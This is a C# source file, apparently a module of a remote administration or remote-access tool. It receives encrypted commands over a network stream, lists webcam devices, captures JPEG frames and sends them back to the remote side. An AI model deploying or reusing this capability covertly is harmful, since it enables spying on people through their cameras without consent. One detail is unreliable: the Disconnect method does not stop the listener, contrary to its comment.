﻿using System.Net.Sockets;
using System.Threading;
using bc.srv.Classes.Comunicator;

namespace bc.srv.Modules.WebCam
{
    internal class WebCamAgent
    {
        public WebCamAgent(NetworkStream ns)
        {
            this.webcamStream = ns;

            this.mfm = new MsgFileManager(this.webcamStream);
            this.mm = new MsgManager(this.webcamStream);
            this.cc = new CapCam();
        }

        /// <summary>
        ///     Avvia thread di ascolto per WebCam Capture
        /// </summary>
        public void StartWebCamListener()
        {
            var t = new Thread(this.WebCamListener);
            t.IsBackground = true;
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
        }


        /// <summary>
        ///     Listener per  WebCam
        /// </summary>
        private void WebCamListener()
        {
            while (SrvData.Instance.isConnected && !this.stopWebCamListener)
            {
                Thread.Sleep(10);

                var cmd = this.mm.WaitForEncryMessageRicorsive(10000);

                if (this.stopWebCamListener)
                    break;

                if (cmd != "TIMEOUT" && cmd != "__ERROR__")
                {
                    var cmdSplit = cmd.Split('|');

                    switch (cmdSplit[0])
                    {
                        case "WC_DEVICES":
                            // INVIA LISTA DEI DEVICE WEBCAM
                            this.SendDevices();
                            break;

                        case "CAPTURE_WC":
                            // CAPTURE_WC|NUMERO DRIVER|QUALITA|DIMENSIONIx|DIMENSIONIy
                            this.SendCapture(int.Parse(cmdSplit[1]), int.Parse(cmdSplit[2]), int.Parse(cmdSplit[3]),
                                int.Parse(cmdSplit[4]));
                            break;

                        case "DISCONNECT_WC":
                            this.Disconnect();
                            break;
                    }
                }
            }

            // ARRIVO QUI PERCHè IL LISTENER è MORTO

            if (SrvData.Instance.nsListaCanali.Contains(this.webcamStream))
                SrvData.Instance.nsListaCanali.Remove(this.webcamStream);


            try
            {
                this.webcamStream.Close();
            }
            catch
            {
            }
        }
        //---------------------------------


        /// <summary>
        ///     Invio la lista dei devices
        /// </summary>
        private void SendDevices()
        {
            var drivers = this.cc.GetWcDrivers();

            var sent = false;

            if (drivers.Count == 0)
            {
                sent = this.mm.SendEncryMessage("NO_WC_DRIVERS", 10000);
            }
            else
            {
                var message = "";
                foreach (var driver in drivers)
                    message += driver + "|";

                message = message.TrimEnd('|');

                sent = this.mm.SendEncryMessage(message, 10000);
            }

            // SE NON RIESCO A MANDARE IL MESSAGGIO CHIUDO IL CANALE
            this.stopWebCamListener = !sent;
        }

        #region MEMBERS

        private readonly NetworkStream webcamStream;

        // AGENTI DI COMUNICAZIONE
        private readonly MsgFileManager mfm;
        private readonly MsgManager mm;
        private readonly CapCam cc;


        private bool isDeviceConnect;

        private bool stopWebCamListener;

        #endregion

        //--------------------------------


        #region METODI

        /// <summary>
        ///     Se non sono connesso al device mi connetto ed invio un
        ///     byte[] cryptato con l'immagine catturata
        /// </summary>
        /// <param name="deviceNumber"></param>
        private void SendCapture(int deviceNumber, int quality, int xSize, int ySize)
        {
            if (!this.isDeviceConnect)
                this.isDeviceConnect = this.Connect(deviceNumber);


            if (this.isDeviceConnect) // RICONTROLLO IN CASO DI TENTATA CONNESSIONE
            {
                var capturedJpg = this.cc.Capture(quality, xSize, ySize);

                if (capturedJpg != null)
                {
                    var sent = this.mfm.SendEncryFileByte(capturedJpg, 10000);
                }
            }
            else
            {
                // impossibile connettersi al device

                this.mm.SendEncryMessage("NO_CONNECTION", 5000);
            }
        }
        //---------------------------------


        /// <summary>
        ///     Connette al device
        /// </summary>
        /// <param name="device"></param>
        /// <returns></returns>
        private bool Connect(int device)
        {
            return this.cc.TryConnect(device);
        }
        //---------------------------------

        /// <summary>
        ///     Disconnette dal device attualmente usato
        ///     DEVI ESSEERE CONNESSO AD UN DEVICE!
        /// </summary>
        private void Disconnect()
        {
            if (this.isDeviceConnect)
                this.cc.Disconnect();

            this.isDeviceConnect = false;
            this.stopWebCamListener = false; // CHIUDE ANCHE IL THREAD DI ASCOLTO
        }

        #endregion
    }
}